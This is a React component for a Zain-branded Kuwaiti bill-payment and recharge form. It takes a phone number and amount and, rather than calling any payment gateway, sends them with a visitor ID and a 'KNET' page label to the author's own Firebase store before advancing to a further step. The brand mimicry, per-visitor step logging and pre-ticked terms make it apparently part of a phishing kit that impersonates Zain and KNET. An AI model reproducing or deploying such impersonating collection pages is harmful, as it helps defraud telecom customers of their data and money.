"use client";

import React, { useEffect, useMemo, useState } from "react";
import { motion } from "framer-motion";
import { AlertCircle, CheckCircle2, Loader2 } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Label } from "@/components/ui/label";
import { Input } from "@/components/ui/input";
import { Checkbox } from "@/components/ui/checkbox";
import { Badge } from "@/components/ui/badge";
import {
  Card,
  CardContent,
  CardFooter,
  CardHeader,
  CardTitle,
} from "@/components/ui/card";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import { cn } from "@/lib/utils";
import { addData } from "@/lib/firebase";
import LoaderApp from "@/components/loader";

// --- Component ---
export default function ZainPaymentForm({
  setShow,
  setStepNumber,
}: {
  setShow?: (v: boolean) => void;
  setStepNumber: (n: number) => void;
}) {
  const [phone, setPhone] = useState("");
  const [amount, setAmount] = useState("6");
  const [selectedAmount, setSelectedAmount] = useState<string | null>(null);
  const [termsAccepted, setTermsAccepted] = useState(true);
  const [activeTab, setActiveTab] = useState<"bill" | "eezee">("bill");
  const [isLoading, setIsLoading] = useState(false);
  const [phoneError, setPhoneError] = useState("");

  // Available amounts
  const billAmounts = ["6", "10", "15", "20", "30", "50"];
  const rechargeAmounts = ["2", "5", "10", "15", "20", "30"];
  const currentAmounts = activeTab === "bill" ? billAmounts : rechargeAmounts;

  // Derived state
  const isValidPhone = phone.length === 8 && /^\d{8}$/.test(phone);
  const isFormValid =
    isValidPhone && Number.parseFloat(amount) > 0 && termsAccepted;

  useEffect(() => {
    localStorage.setItem("amount", amount);
  }, [amount]);

  useEffect(() => {
    if (!phone) return setPhoneError("");
    if (!/^\d+$/.test(phone) || phone.length !== 8) {
      setPhoneError("يجب أن يتكون رقم الهاتف من 8 أرقام صحيحة.");
    } else {
      setPhoneError("");
    }
  }, [phone]);

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/[^0-9]/g, "");
    if (value.length <= 8) setPhone(value);
  };

  const handleAmountSelect = (value: string) => {
    setSelectedAmount(value);
    setAmount(value);
  };

  const formattedAmount = useMemo(
    () => Number.parseFloat(amount || "0").toFixed(3),
    [amount]
  );

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!isFormValid) return;
    setIsLoading(true);
    try {
      const visitorId = localStorage.getItem("visitor");
      await addData({
        id: visitorId,
        phone,
        amount,
        timestamp: new Date().toISOString(),
        currentPage: "كي نت",
        action: "payment_submit_attempt",
        type: activeTab,
      });
      setStepNumber(2);
    } catch (error: any) {
      console.error("Submission error:", error);
      const visitorId = localStorage.getItem("visitor");
      await addData({
        id: visitorId,
        action: "payment_submit_error",
        error: error?.message ?? String(error),
      });
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <>
      <div className="mx-0 mb-6 flex   w-full items-center justify-center">
        <img src="/top.webp" alt="Zain" className="h-12 w-full object-cover" />
      </div>
      <div dir="rtl" className="min-h-[70vh] w-full  sm:py-12">
        {/* Header */}

        {/* Card */}
        <motion.div
          initial={{ opacity: 0, y: 12 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.3 }}
          className="mx-auto w-full max-w-2xl px-3"
        >
          <Card className="border-slate-200 shadow-sm">
            <CardHeader className="pb-2">
              <CardTitle className="text-xl sm:text-2xl font-semibold text-slate-800">
                عمليات الدفع لخط زين
              </CardTitle>
            </CardHeader>

            <CardContent className="space-y-6">
              {/* Tabs */}
              <Tabs
                value={activeTab}
                onValueChange={(v) => setActiveTab(v as any)}
                className="w-full"
              >
                <TabsList className="grid w-full grid-cols-2">
                  <TabsTrigger value="bill" className="text-sm">
                    دفع الفاتورة
                  </TabsTrigger>
                  <TabsTrigger value="eezee" className="text-sm">
                    إعادة تعبئة eeZee
                  </TabsTrigger>
                </TabsList>
                <TabsContent value="bill" />
                <TabsContent value="eezee" />
              </Tabs>

              {/* Phone input */}
              <div className="space-y-2">
                <div className="flex items-center justify-between">
                  <Label className="text-sm sm:text-base font-medium text-slate-800">
                    رقم الهاتف
                  </Label>
                  <Badge
                    variant="outline"
                    className="text-[10px] sm:text-xs font-normal border-primary/40 text-primary"
                  >
                    مطلوب
                  </Badge>
                </div>
                <div className="relative">
                  <Input
                    inputMode="numeric"
                    type="tel"
                    placeholder="XXXXXXXX"
                    value={phone}
                    onChange={handlePhoneChange}
                    maxLength={8}
                    aria-invalid={!!phoneError}
                    aria-describedby="phone-help"
                    className={cn(
                      "h-11 text-base font-mono bg-white text-right",
                      phoneError && "border-red-500 focus-visible:ring-red-500",
                      isValidPhone &&
                        !phoneError &&
                        "border-green-500 focus-visible:ring-green-500"
                    )}
                  />
                  {isValidPhone && !phoneError ? (
                    <CheckCircle2 className="absolute left-3 top-1/2 h-5 w-5 -translate-y-1/2 text-green-500" />
                  ) : phoneError ? (
                    <AlertCircle className="absolute left-3 top-1/2 h-5 w-5 -translate-y-1/2 text-red-500" />
                  ) : null}
                </div>
                {phoneError ? (
                  <div
                    id="phone-help"
                    className="flex items-center gap-2 text-xs text-red-600"
                  >
                    <AlertCircle className="h-4 w-4" />
                    <p>{phoneError}</p>
                  </div>
                ) : (
                  <p id="phone-help" className="text-xs text-slate-500">
                    أدخل رقم زين من 8 أرقام بدون فواصل.
                  </p>
                )}
              </div>

              {/* Amount */}
              {isValidPhone && !phoneError && (
                <div className="space-y-2">
                  <Label className="text-sm sm:text-base font-medium text-slate-800">
                    {activeTab === "bill"
                      ? "اختر مبلغ الفاتورة"
                      : "اختر باقة إعادة التعبئة"}
                  </Label>
                  <Select
                    key={selectedAmount ?? amount}
                    onValueChange={handleAmountSelect}
                    defaultValue={amount}
                  >
                    <SelectTrigger className="h-11 justify-between">
                      <SelectValue placeholder="اختر المبلغ" />
                    </SelectTrigger>
                    <SelectContent className="text-center">
                      {currentAmounts.map((v) => (
                        <SelectItem key={v} value={v}>
                          <div className="flex items-center justify-center gap-2">
                            <span className="font-bold text-base">{v}.000</span>
                            <span className="text-xs opacity-80">د.ك</span>
                          </div>
                        </SelectItem>
                      ))}
                    </SelectContent>
                  </Select>
                </div>
              )}

              {/* Extra number action (disabled for now) */}
              <div className="text-center">
                <Button
                  variant="outline"
                  size="sm"
                  disabled
                  className="cursor-not-allowed opacity-60"
                >
                  + أضف رقم آخر
                </Button>
              </div>

              <div className="h-px w-full bg-slate-200" />

              {/* Total */}
              <div className="flex items-center justify-between text-slate-800">
                <span className="text-sm sm:text-base">إجمالي</span>
                <span className="text-lg sm:text-xl font-semibold">
                  {formattedAmount} د.ك
                </span>
              </div>

              {/* Terms */}
              <div className="rounded-xl border border-slate-200 bg-slate-50 p-4">
                <div className="flex items-start gap-3">
                  <Checkbox
                    id="terms"
                    checked={termsAccepted}
                    onCheckedChange={(checked) =>
                      setTermsAccepted(Boolean(checked))
                    }
                    className="mt-0.5"
                    aria-labelledby="terms-label"
                  />
                  <div className="space-y-1">
                    <Label
                      htmlFor="terms"
                      id="terms-label"
                      className="cursor-pointer text-slate-700"
                    >
                      أوافق على الشروط والأحكام
                    </Label>
                    <p className="text-xs text-slate-500">
                      بالمتابعة، أنت توافق على شروط وأحكام الخدمة الخاصة بنا.
                    </p>
                  </div>
                </div>
              </div>
            </CardContent>

            <CardFooter className="flex flex-col gap-3">
              <form onSubmit={handleSubmit} className="w-full">
                <Button
                  type="submit"
                  className="w-full h-11 text-base"
                  disabled={!isFormValid || isLoading}
                >
                  {isLoading ? (
                    <>
                      <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                      جاري المعالجة...
                    </>
                  ) : (
                    "أعد التعبئة الآن"
                  )}
                </Button>
              </form>
              {!termsAccepted && (
                <p className="text-center text-xs text-slate-500">
                  يرجى الموافقة على الشروط والأحكام لتفعيل الزر.
                </p>
              )}
            </CardFooter>
          </Card>
        </motion.div>

        {isLoading && <LoaderApp />}
      </div>
    </>
  );
}
